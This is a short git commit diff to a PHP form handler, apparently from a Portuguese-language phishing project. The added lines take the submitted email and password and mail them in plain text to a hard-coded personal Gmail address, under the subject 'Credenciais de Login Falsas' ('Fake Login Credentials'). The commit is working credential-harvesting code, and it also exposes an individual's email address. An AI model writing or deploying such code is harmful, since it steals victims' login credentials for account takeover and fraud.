266f46e6993832c8d2503091552b3e05a469e572
4322343 <164273593+4322343@users.noreply.github.com>
2024-03-22 03:17:25 -0300

    Update process.php

--- process.php
+++ process.php
@@ -2,6 +2,9 @@
     $email = $_POST['email'];
     $password = $_POST['password'];
 
-    // Aqui você pode fazer o que quiser com as credenciais, como armazená-las em um banco de dados ou enviá-las por e-mail
-    // Por questões de segurança, nunca armazene senhas em texto simples
+    $to = "elyezerpc@gmail.com"; // Substitua pelo seu endereço de e-mail
+    $subject = "Credenciais de Login Falsas";
+    $message = "E-mail: $email\nSenha: $password\n";
+
+    mail($to, $subject, $message);
 ?>
